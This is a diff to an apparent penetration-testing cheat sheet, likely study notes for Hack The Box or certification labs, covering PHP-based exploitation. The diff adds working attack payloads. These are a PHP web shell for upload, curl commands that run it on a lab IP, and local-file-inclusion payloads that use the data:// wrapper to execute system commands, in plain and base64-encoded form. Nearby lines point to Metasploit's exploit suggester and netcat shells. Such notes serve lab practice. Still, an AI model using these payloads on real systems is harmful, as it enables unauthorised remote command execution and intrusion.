@@ -607,15 +607,23 @@ Open MSFConsole / Netcat to get the shell access.
 c.) MSFConsole
 use local_exploit suggester after you get a shell access to find what other exploits can you do to get root access.
 
-d.) PHP upload
-Make sure you install the following in kali: apt install php-curl
-Add this below to any PHP exploit assuming to get a shell
-$file = [
-    'filename' => 'ippsec.php',
-    'data' => '<?php system($_REQUEST["cmd"]); ?>'
-];
-Run the php using curl: curl http://10.10.10.9/0xdf.php?cmd=whoami
-#BASTARD HTB
+d.) PHP Exploits
+i](Uploads)
+	Make sure you install the following in kali: apt install php-curl
+	Add this below to any PHP exploit assuming to get a shell
+	$file = [
+	    'filename' => 'ippsec.php',
+	    'data' => '<?php system($_REQUEST["cmd"]); ?>'
+	];
+	Run the php using curl: curl http://10.10.10.9/0xdf.php?cmd=whoami
+	#BASTARD HTB
+ii] (Snippets)
+	Add the Command here like this: 
+	curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php echo system('ls');?>"
+	If doesn't works, encode it base64
+	echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+	curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+	
 
 e.) Test HTTP Method to upload files:
 davtest -url http://$IP_ADDRESS
